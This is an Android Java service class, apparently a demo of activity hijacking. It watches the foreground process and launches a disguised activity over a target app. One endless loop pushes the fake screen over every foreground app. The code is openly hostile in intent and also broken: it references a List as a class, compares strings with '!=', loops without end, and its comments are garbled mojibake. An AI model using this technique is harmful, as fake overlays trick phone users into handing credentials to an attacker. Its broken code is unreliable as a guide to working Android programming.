package com.example.crakebroadcast;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class hijackservice extends Service {
	List<String> hajacklist = new ArrayList<String>();
	Handler handler = new Handler();
	HashMap<String, Class<?>> targetMap = new HashMap<String, Class<?>>();

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		// ��ʼ�����ٳֵĽ���

		handler.postDelayed(searchTarget, 1000);

	}

	@Override
	public void onStart(Intent intent, int startId) {
		// �����ǵ�Ŀ�����targetMap��
		// ���keyΪ���ǵ�Ŀ����̣�valueΪ����α���Activity
		targetMap.put("com.example.broadcasttest", MainActivity.class);
		inithijackprocess();// ����searchTarget
		handler.postDelayed(searchTarget, 1000);

	}

	// ����һ���߳������ٳֶ���ÿ��200��ִ��һ��
	final Runnable searchTarget = new Runnable() {
		@Override
		public void run() {
			// TODO Auto-generated method stub
			// �õ�activityManager������
			ActivityManager aManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
			// ö�ٵ�ǰ�������еĽ���
			List<RunningAppProcessInfo> infos = aManager.getRunningAppProcesses();
			Toast.makeText(getApplicationContext(), "this is", 0).show();
			for (RunningAppProcessInfo psinfo : infos) {
				// �������е�ǰ̨����
				  if (psinfo.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
String string=psinfo.processName;
					  Toast.makeText(getApplicationContext(), string, 0).show();

					System.out.println("2");
					//�ٳ�broadcast����
					if (targetMap.containsKey(psinfo.processName)) {
						System.out.println("1");
						Toast.makeText(getApplicationContext(), "this was", 0).show();
						Log.d("com.droider.hijack", "hijacking");
						Intent intent = new Intent(getApplicationContext(), hajacklist.class);
						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						intent.putExtra("processname", psinfo.processName);
						// ����α���activity
						getApplication().startActivity(intent);

					}

			//�ٳ����н���---������ҵ��ֻ�
					while (psinfo.processName!="com.example.crakebroadcast") {
						Toast.makeText(getApplicationContext(), "hijackall", 0).show();
						Log.d("com.droider.hijack", "hijacking");
						Intent intent = new Intent(getApplicationContext(), hajacklist.class);
						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						intent.putExtra("processname", psinfo.processName);
						// ����α���activity
						getApplication().startActivity(intent);
					}
					
				}
			}
			 handler.postDelayed(searchTarget, 2000);
		}
	};

	private void inithijackprocess() {
		// TODO Auto-generated method stub
		//targetMap.put("com.example.broadcasttest", MainActivity.class);
	}

}
